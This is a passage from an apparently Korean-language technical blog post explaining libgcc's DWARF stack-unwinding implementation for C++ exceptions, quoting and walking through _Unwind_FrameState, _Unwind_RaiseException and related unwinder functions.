_Unwind_Word args_size;</span><br><span class="line">    <span class="type">char</span> by_value[__LIBGCC_DWARF_FRAME_REGISTERS__ + <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ì´ì™¸ì—ë„ CIEì™€ FDEì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í•´ì„í•˜ì—¬ êµ¬ì„±í•œ í˜¸ì¶œ í”„ë ˆì„ í…Œì´ë¸”ì˜ í–‰ì„ ë‚˜íƒ€ë‚´ëŠ” <code>_Unwind_FrameState</code> êµ¬ì¡°ì²´ê°€ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì •ì˜ì—ì„œ <code>reg</code> ë°°ì—´ì€ R1, â€¦ , RN ë ˆì§€ìŠ¤í„°ë“¤ì˜ ê°’ì„ ë³µì›í•´ì•¼ í•˜ëŠ”ì§€, ë³µì›í•œë‹¤ë©´ CFAì™€ ì˜¤í”„ì…‹ì„ ê¸°ì¤€ìœ¼ë¡œ ë³µì›í•˜ëŠ”ì§€, ë‹¤ë¥¸ ë ˆì§€ìŠ¤í„°ì˜ ê°’ìœ¼ë¡œ ë³µì›í•˜ëŠ”ì§€ ë“±ì˜ ë°©ë²•ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. <code>cfa_offset</code> ê³¼ <code>cfa_reg</code> í•„ë“œëŠ” CFAë¥¼ ì •ì˜í•˜ëŠ” ë ˆì§€ìŠ¤í„°ì™€ ì˜¤í”„ì…‹ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. <code>personality</code> í•„ë“œì—ëŠ” ëŸ°íƒ€ì„ì— CIEì˜ <code>augmentation</code> í•„ë“œë¥¼ ì½ê³  personality ë£¨í‹´ì˜ ì£¼ì†Œë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The result of interpreting the frame unwind info for a frame.</span></span><br><span class="line"><span class="comment">   This is all symbolic at this point, as none of the values can</span></span><br><span class="line"><span class="comment">   be resolved until the target pc is located.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Each register save state can be described in terms of a CFA slot,</span></span><br><span class="line"><span class="comment">     another register, or a location expression.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">frame_state_reg_info</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">      <span class="keyword">union</span> &#123;</span><br><span class="line">_Unwind_Word reg;</span><br><span class="line">_Unwind_Sword offset;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *exp;</span><br><span class="line">      &#125; loc;</span><br><span class="line">      <span class="keyword">enum</span> &#123;</span><br><span class="line">REG_UNSAVED,</span><br><span class="line">REG_SAVED_OFFSET,</span><br><span class="line">REG_SAVED_REG,</span><br><span class="line">REG_SAVED_EXP,</span><br><span class="line">REG_SAVED_VAL_OFFSET,</span><br><span class="line">REG_SAVED_VAL_EXP,</span><br><span class="line">REG_UNDEFINED</span><br><span class="line">      &#125; how;</span><br><span class="line">    &#125; reg[__LIBGCC_DWARF_FRAME_REGISTERS__+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used to implement DW_CFA_remember_state.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">frame_state_reg_info</span> *prev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The CFA can be described in terms of a reg+offset or a</span></span><br><span class="line"><span class="comment">       location expression.  */</span></span><br><span class="line">    _Unwind_Sword cfa_offset;</span><br><span class="line">    _Unwind_Word cfa_reg;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *cfa_exp;</span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">      CFA_UNSET,</span><br><span class="line">      CFA_REG_OFFSET,</span><br><span class="line">      CFA_EXP</span><br><span class="line">    &#125; cfa_how;</span><br><span class="line">  &#125; regs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The PC described by the current frame state.  */</span></span><br><span class="line">  <span class="type">void</span> *pc;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The information we care about from the CIE/FDE.  */</span></span><br><span class="line">  _Unwind_Personality_Fn personality;</span><br><span class="line">  _Unwind_Sword data_align;</span><br><span class="line">  _Unwind_Word code_align;</span><br><span class="line">  _Unwind_Word retaddr_column;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> fde_encoding;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> lsda_encoding;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> saw_z;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> signal_frame;</span><br><span class="line">  <span class="type">void</span> *eh_ptr;</span><br><span class="line">&#125; _Unwind_FrameState;</span><br></pre></td></tr></table></figure><p>ì´ì œ Unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì˜ˆì™¸ë¥¼ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ë“¤ì´ ì–´ë–»ê²Œ êµ¬í˜„ë˜ì–´ ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ë°˜í™˜ê°’ì´ ìˆëŠ” ëŒ€ë¶€ë¶„ì˜ í•¨ìˆ˜ëŠ” <code>_Unwind_Reason_Code</code> ì—´ê±°í˜•ì„ ë°˜í™˜í•©ë‹ˆë‹¤. ê°ê°ì˜ ê°’ë“¤ì€ í•©ìˆ˜ì˜ ì„±ê³µ ë° ì‹¤íŒ¨ ì—¬ë¶€, ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ê³„ì† ìˆ˜í–‰í•´ì•¼ í•˜ëŠ”ì§€ ë“±ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The unwind interface uses reason codes in several contexts to</span></span><br><span class="line"><span class="comment">   identify the reasons for failures or other actions.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">  _URC_NO_REASON = <span class="number">0</span>,</span><br><span class="line">  _URC_FOREIGN_EXCEPTION_CAUGHT = <span class="number">1</span>,</span><br><span class="line">  _URC_FATAL_PHASE2_ERROR = <span class="number">2</span>,</span><br><span class="line">  _URC_FATAL_PHASE1_ERROR = <span class="number">3</span>,</span><br><span class="line">  _URC_NORMAL_STOP = <span class="number">4</span>,</span><br><span class="line">  _URC_END_OF_STACK = <span class="number">5</span>,</span><br><span class="line">  _URC_HANDLER_FOUND = <span class="number">6</span>,</span><br><span class="line">  _URC_INSTALL_CONTEXT = <span class="number">7</span>,</span><br><span class="line">  _URC_CONTINUE_UNWIND = <span class="number">8</span></span><br><span class="line">&#125; _Unwind_Reason_Code;</span><br></pre></td></tr></table></figure><p><code>_Unwind_RaiseException</code> í•¨ìˆ˜ëŠ” <code>_Unwind_Exception</code> êµ¬ì¡°ì²´ë¥¼ ë°›ì•„ ì˜ˆì™¸ë¥¼ ì¼ìœ¼í‚¤ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. 10í–‰ì€ <code>this_context</code> ì™€ <code>cur_context</code> ë¥¼ í˜„ì¬ ìŠ¤íƒ í”„ë ˆì„ì˜ ë‚´ìš©ìœ¼ë¡œ ì´ˆê¸°í™”í•©ë‹ˆë‹¤. 15í–‰ì€ search ë‹¨ê³„ì— í•´ë‹¹í•˜ëŠ” ë°˜ë³µë¬¸ìœ¼ë¡œ, personality ë£¨í‹´ì´ ëœë”© íŒ¨ë“œë¥¼ ì°¾ì•„ë‚¸ ê²½ìš°ì—ë§Œ íƒˆì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 20í–‰ì€ <code>cur_context</code> í”„ë ˆì„ì— í•´ë‹¹í•˜ëŠ” CIEì™€ FDEë¥¼ ì½ê³  <code>_Unwind_FrameState</code> êµ¬ì¡°ì²´ <code>fs</code> ë¥¼ ì´ˆê¸°í™”í•˜ëŠ” ë‚´ì¥ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. 32í–‰ì€ personality ë£¨í‹´ì´ ìˆë‹¤ë©´ í˜¸ì¶œí•©ë‹ˆë‹¤. 42í–‰ì€ <code>fs</code> ë¥¼ ë°˜ì˜í•˜ì—¬ <code>cur_context</code> ê°€ ì´ì „ í”„ë ˆì„ì˜ ë‚´ìš©ì„ ë‚˜íƒ€ë‚´ë„ë¡ í•©ë‹ˆë‹¤.</p><p>ë°˜ë³µë¬¸ ì´í›„ëŠ” cleanup ë‹¨ê³„ë¥¼ ìˆ˜í–‰í•˜ê³  ì‹¤í–‰ íë¦„ì„ ë˜ëŒë¦¬ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. 51í–‰ì€ <code>_Unwind_RaiseException_Phase2</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ cleanup ë‹¨ê³„ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì´ í•¨ìˆ˜ê°€ ë°˜í™˜í•˜ë©´ <code>cur_context</code> ëŠ” ì‹¤í–‰ íë¦„ì„ ì˜®ê¸¸ ëœë”© íŒ¨ë“œì˜ ë‚´ìš©ì„, <code>frames</code> ë³€ìˆ˜ëŠ” ë˜ê°ì•„ì•¼ í•  ìŠ¤íƒ í”„ë ˆì„ì˜ ê°œìˆ˜ë¥¼ ë‚˜íƒ€ë‚´ê²Œ ë©ë‹ˆë‹¤. 55í–‰ì€ <code>cur_context</code> ì˜ ë‚´ìš©ì„ ì‹¤ì œ ë ˆì§€ìŠ¤í„°ì— ë°˜ì˜í•˜ì—¬ ì‹¤í–‰ íë¦„ì„ ì˜®ê¸°ëŠ” ë§¤í¬ë¡œë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ë”°ë¼ì„œ ëœë”© íŒ¨ë“œë¥¼ ì°¾ì§€ ëª»í•˜ëŠ” ë“±ì˜ ì‹¤íŒ¨ê°€ ë°œìƒí•˜ì§€ ì•ŠëŠ” ì´ìƒ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ëŠ” ë°˜í™˜í•˜ì§€ ì•Šìœ¼ë©°, ëœë”© íŒ¨ë“œë¡œ ê³§ë°”ë¡œ ë¶„ê¸°í•˜ì—¬ ì‹¤í–‰ íë¦„ì„ ì´ì–´ê°‘ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Raise an exception, passing along the given exception object.  */</span></span><br><span class="line"></span><br><span class="line">_Unwind_Reason_Code LIBGCC2_UNWIND_ATTRIBUTE</span><br><span class="line">_Unwind_RaiseException(<span class="keyword">struct</span> _Unwind_Exception *exc) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_Unwind_Context</span> this_context, cur_context;</span><br><span class="line">    _Unwind_Reason_Code code;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> frames;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set up this_context to describe the current stack frame.  */</span></span><br><span class="line">    <span class="built_in">uw_init_context</span>(&amp;this_context);</span><br><span class="line">    cur_context = this_context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 1: Search.  Unwind the stack, calling the personality routine</span></span><br><span class="line"><span class="comment">       with the _UA_SEARCH_PHASE flag set.  Do not modify the stack yet.  */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        _Unwind_FrameState fs;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Set up fs to describe the FDE for the caller of cur_context.  The</span></span><br><span class="line"><span class="comment">       first time through the loop, that means __cxa_throw.  */</span></span><br><span class="line">        code = <span class="built_in">uw_frame_state_for</span>(&amp;cur_context, &amp;fs);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (code == _URC_END_OF_STACK)</span><br><span class="line">            <span class="comment">/* Hit end of stack with no handler found.  */</span></span><br><span class="line">            <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">            <span class="comment">/* Some error encountered.  Usually the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">               diagnose these and merely crashes.  */</span></span><br><span class="line">            <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fs.personality) &#123;</span><br><span class="line">            code = (*fs.personality)(<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">                                     exc, &amp;cur_context);</span><br><span class="line">            <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">                <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Update cur_context to describe the same frame as fs.  */</span></span><br><span class="line">        <span class="built_in">uw_update_context</span>(&amp;cur_context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Indicate to _Unwind_Resume and associated subroutines that this</span></span><br><span class="line"><span class="comment">       is not a forced unwind.  Further, note where we found a handler.  */</span></span><br><span class="line">    exc-&gt;private_1 = <span class="number">0</span>;</span><br><span class="line">    exc-&gt;private_2 = <span class="built_in">uw_identify_context</span>(&amp;cur_context);</span><br><span class="line"></span><br><span class="line">    cur_context = this_context;</span><br><span class="line">    code = _Unwind_RaiseException_Phase2(exc, &amp;cur_context, &amp;frames);</span><br><span class="line">    <span class="keyword">if</span> (code != _URC_INSTALL_CONTEXT)</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">uw_install_context</span>(&amp;this_context, &amp;cur_context, frames);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>uw_frame_state_for</code> ë‚´ì¥ í•¨ìˆ˜ëŠ” <code>_Unwind_Context</code> êµ¬ì¡°ì²´ <code>context</code> ë¥¼ ë°›ì•„ í”„ë ˆì„ì— í•´ë‹¹í•˜ëŠ” CIEì™€ FDEì˜ í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í•´ì„í•˜ì—¬ <code>_Unwind_FrameState</code> êµ¬ì¡°ì²´ <code>fs</code> ë¥¼ ì´ˆê¸°í™”í•©ë‹ˆë‹¤. 19í–‰ê³¼ 34í–‰ì—ì„œ CIEì™€ FDEì˜ ì£¼ì†Œë¥¼ ì°¾ê³ , 35í–‰ì—ì„œ <code>extract_cie_info</code> ë‚´ì¥ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ CIEì˜ í•„ë“œë¥¼ ì½ê³  <code>fs</code> êµ¬ì¡°ì²´ì—ì„œ í•´ë‹¹í•˜ëŠ” ê°’ë“¤ì„ ì´ˆê¸°í™”í•©ë‹ˆë‹¤. <code>fs</code> ì˜ <code>personality</code> í•„ë“œëŠ” ì´ í•¨ìˆ˜ ë‚´ì—ì„œ ì´ˆê¸°í™”ë©ë‹ˆë‹¤. ì´í›„ 42í–‰ê³¼ 64í–‰ì—ì„œ <code>execute_cfa_program</code> ë‚´ì¥ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í•´ì„í•˜ê³  CFA ë° ë ˆì§€ìŠ¤í„°ë“¤ê³¼ ê´€ë ¨ëœ ë‚´ìš©ì„ ì´ˆê¸°í™”í•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Given the _Unwind_Context CONTEXT for a stack frame, look up the FDE for</span></span><br><span class="line"><span class="comment">   its caller and decode it into FS.  This function also sets the</span></span><br><span class="line"><span class="comment">   args_size and lsda members of CONTEXT, as they are really information</span></span><br><span class="line"><span class="comment">   about the caller&#x27;s frame.  */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> _Unwind_Reason_Code</span></span><br><span class="line"><span class="function"><span class="title">uw_frame_state_for</span><span class="params">(<span class="keyword">struct</span> _Unwind_Context *context, _Unwind_FrameState *fs)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">dwarf_fde</span> *fde;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">dwarf_cie</span> *cie;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *aug, *insn, *end;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fs, <span class="number">0</span>, <span class="built_in">sizeof</span>(*fs));</span><br><span class="line">    context-&gt;args_size = <span class="number">0</span>;</span><br><span class="line">    context-&gt;lsda = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;ra == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"></span><br><span class="line">    fde = _Unwind_Find_FDE(context-&gt;ra + _Unwind_IsSignalFrame(context) - <span class="number">1</span>,</span><br><span class="line">                           &amp;context-&gt;bases);</span><br><span class="line">    <span class="keyword">if</span> (fde == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> MD_FALLBACK_FRAME_STATE_FOR</span></span><br><span class="line">        <span class="comment">/* Couldn&#x27;t find frame unwind info for this function.  Try a</span></span><br><span class="line"><span class="comment">       target-specific fallback mechanism.  This will necessarily</span></span><br><span class="line"><span class="comment">       not provide a personality routine or LSDA.  */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MD_FALLBACK_FRAME_STATE_FOR</span>(context, fs);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs-&gt;pc = context-&gt;bases.func;</span><br><span class="line"></span><br><span class="line">    cie = <span class="built_in">get_cie</span>(fde);</span><br><span class="line">    insn = <span class="built_in">extract_cie_info</span>(cie, context, fs);</span><br><span class="line">    <span class="keyword">if</span> (insn == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="comment">/* CIE contained unknown augmentation.  */</span></span><br><span class="line">        <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First decode all the insns in the CIE.  */</span></span><br><span class="line">    end = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">next_fde</span>((<span class="type">const</span> <span class="keyword">struct</span> dwarf_fde *)cie);</span><br><span class="line">    <span class="built_in">execute_cfa_program</span>(insn, end, context, fs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Locate augmentation for the fde.  */</span></span><br><span class="line">    aug = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)fde + <span class="built_in">sizeof</span>(*fde);</span><br><span class="line">    aug += <span class="number">2</span> * <span class="built_in">size_of_encoded_value</span>(fs-&gt;fde_encoding);</span><br><span class="line">    insn = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (fs-&gt;saw_z) &#123;</span><br><span class="line">        <span class="type">_uleb128_t</span> i;</span><br><span class="line">        aug = <span class="built_in">read_uleb128</span>(aug, &amp;i);</span><br><span class="line">        insn = aug + i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fs-&gt;lsda_encoding != DW_EH_PE_omit) &#123;</span><br><span class="line">        _Unwind_Ptr lsda;</span><br><span class="line"></span><br><span class="line">        aug = <span class="built_in">read_encoded_value</span>(context, fs-&gt;lsda_encoding, aug, &amp;lsda);</span><br><span class="line">        context-&gt;lsda = (<span class="type">void</span> *)lsda;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Then the insns in the FDE up to our target PC.  */</span></span><br><span class="line">    <span class="keyword">if</span> (insn == <span class="literal">NULL</span>)</span><br><span class="line">        insn = aug;</span><br><span class="line">    end = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">next_fde</span>(fde);</span><br><span class="line">    <span class="built_in">execute_cfa_program</span>(insn, end, context, fs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _URC_NO_REASON;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_Unwind_RaiseException_Phase2</code> í•¨ìˆ˜ëŠ” cleanup ë‹¨ê³„ë¥¼ ë¶„ë¦¬í•˜ì—¬ ì‘ì„±í•œ í•¨ìˆ˜ì…ë‹ˆë‹¤. ì „ë°˜ì ì¸ ë¡œì§ì€ í˜¸ì¶œìì¸ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ì™€ ê±°ì˜ ë™ì¼í•©ë‹ˆë‹¤. <code>frames</code> ë³€ìˆ˜ë¥¼ í†µí•´ ë˜ê°ì„ ìŠ¤íƒ í”„ë ˆì„ì˜ ê°œìˆ˜ë¥¼ ì„¸ê³ , personality ë£¨í‹´ì„ í˜¸ì¶œí•  ë•Œ <code>_UA_CLEANUP_PHASE</code> í”Œë˜ê·¸ë¥¼ ì „ë‹¬í•˜ì—¬ cleanup ë‹¨ê³„ì„ì„ ì•Œ ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ì°¨ì´ê°€ ìˆìŠµë‹ˆë‹¤. Personality ë£¨í‹´ì´ ëœë”© íŒ¨ë“œë¥¼ ì°¾ì•„ <code>_URC_INSTALL_CONTEXT</code> ì½”ë“œë¥¼ ë°˜í™˜í•˜ë©´ ë°˜ë³µë¬¸ì„ íƒˆì¶œí•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Subroutine of _Unwind_RaiseException also invoked from _Unwind_Resume.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Unwind the stack calling the personality routine to find both the</span></span><br><span class="line"><span class="comment">   exception handler and intermediary cleanup code.  We&#x27;ll only locate</span></span><br><span class="line"><span class="comment">   the first such frame here.  Cleanup code will call back into</span></span><br><span class="line"><span class="comment">   _Unwind_Resume and we&#x27;ll continue Phase 2 there.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException_Phase2(<span class="keyword">struct</span> _Unwind_Exception *exc,</span><br><span class="line">                              <span class="keyword">struct</span> _Unwind_Context *context,</span><br><span class="line">                              <span class="type">unsigned</span> <span class="type">long</span> *frames_p) &#123;</span><br><span class="line">    _Unwind_Reason_Code code;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> frames = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        _Unwind_FrameState fs;</span><br><span class="line">        <span class="type">int</span> match_handler;</span><br><span class="line"></span><br><span class="line">        code = <span class="built_in">uw_frame_state_for</span>(context, &amp;fs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Identify when we&#x27;ve reached the designated handler context.  */</span></span><br><span class="line">        match_handler = (<span class="built_in">uw_identify_context</span>(context) == exc-&gt;private_2</span><br><span class="line">                             ? _UA_HANDLER_FRAME</span><br><span class="line">                             : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">            <span class="comment">/* Some error encountered.  Usually the unwinder doesn&#x27;t</span></span><br><span 